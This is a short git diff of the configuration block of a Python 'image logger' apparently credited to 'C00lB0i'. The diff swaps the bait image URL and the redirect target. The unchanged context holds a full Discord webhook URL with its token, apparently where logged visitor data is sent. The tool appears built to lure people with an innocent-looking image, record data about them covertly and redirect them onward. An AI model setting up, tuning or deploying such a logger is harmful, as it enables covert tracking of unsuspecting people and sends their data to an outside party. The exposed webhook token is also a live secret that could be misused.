@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1481629600353095801/b8zb65WAR0VCXbO12RJDDPKjgpYbmgKvscooiEn7u_SLY1aoodkwkKfAhkKSYnoVOquC",
-    "image": "https://i2.ruliweb.com/img/5/3/7/9/5379F4893A290A0017", # You can also have a custom image by using a URL argument
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRHsU06RNyMELY_CCup7OkIxcYT32ebaSYcNw&s", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://i2.ruliweb.com/img/5/3/7/9/5379F4893A290A0017" # Link to the webpage to redirect to 
+        "page": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRHsU06RNyMELY_CCup7OkIxcYT32ebaSYcNw&s" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
